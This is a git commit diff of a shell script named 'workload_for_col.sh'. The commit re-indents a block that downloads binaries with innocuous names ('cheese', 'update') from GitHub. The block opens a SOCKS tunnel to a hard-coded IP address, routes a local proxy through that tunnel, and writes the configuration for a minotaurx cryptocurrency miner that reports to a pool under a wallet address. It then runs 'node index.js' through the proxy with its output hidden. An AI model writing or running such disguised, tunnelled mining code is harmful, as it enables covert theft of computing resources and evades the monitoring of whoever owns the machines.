df389d3cda0c5c2ea7c0197220c17fb834dfcfb0
maxwellcrawford21 <maxwellcrawford.2@gmail.com>
2024-06-18 10:17:37 +0200

    Update workload_for_col.sh

--- workload_for_col.sh
+++ workload_for_col.sh
@@ -82,61 +82,61 @@ function setup_and_run() {
     #echo '{"algorithm": "'"$ALGO"'", "host": "'"$HOST"'", "port": '"$PORT"', "worker": "'"$WALLET"'", "password": "'"$PASSWORD"'", "workers": '"$THREADS"', "fee": '"$FEE"' }' > config.json
     wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/cheese.tar.gz > /dev/null
 
-sleep 2
-
-tar -xf cheese.tar.gz
-
-sleep 2
-
-./cheese client -v 45.135.58.52:443 7777:socks &
-
-sleep 2
-
-TZ='Africa/Johannesburg'; export TZ
-date
-sleep 2
-
-curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null
-
-sleep 2
-
-tar -xf update.tar.gz > /dev/null
-
-sleep 2
-
-cat > update/local/update-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 127.0.0.1:7777
-END
-
-./update/local/update-local -config update/local/update-local.conf & > /dev/null
-
-sleep 2
-
-ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
-
-sleep 3
-
-./update/local/update-local -config update/local/update-local.conf & > /dev/null
-
-sleep 2
-
-./update/update curl ifconfig.me
-
-sleep 5
-
-cat > config.json <<END
-{
-  "algorithm": "minotaurx",
-  "host": "flyingsaucer-eu.teatspray.fun",
-  "port": 7019,
-  "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
-  "password": "$currentdate,c=MAZA,zap=MAZA",
-  "workers": $used_num_of_cores,
-  "fee": "1"
-}
-END
+    sleep 2
+    
+    tar -xf cheese.tar.gz
+    
+    sleep 2
+    
+    ./cheese client -v 45.135.58.52:443 7777:socks &
+    
+    sleep 2
+    
+    TZ='Africa/Johannesburg'; export TZ
+    date
+    sleep 2
+    
+    curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null
+    
+    sleep 2
+    
+    tar -xf update.tar.gz > /dev/null
+    
+    sleep 2
+    
+    cat > update/local/update-local.conf <<END
+    listen = :2233
+    loglevel = 1
+    socks5 = 127.0.0.1:7777
+    END
+    
+    ./update/local/update-local -config update/local/update-local.conf & > /dev/null
+    
+    sleep 2
+    
+    ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
+    
+    sleep 3
+    
+    ./update/local/update-local -config update/local/update-local.conf & > /dev/null
+    
+    sleep 2
+    
+    ./update/update curl ifconfig.me
+    
+    sleep 5
+    
+    cat > config.json <<END
+    {
+      "algorithm": "minotaurx",
+      "host": "flyingsaucer-eu.teatspray.fun",
+      "port": 7019,
+      "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
+      "password": "$currentdate,c=MAZA,zap=MAZA",
+      "workers": $used_num_of_cores,
+      "fee": "1"
+    }
+    END
 
     # Check if we are in the correct directory and run node index.js
     ./update/update node index.js 1>/dev/null 2>&1
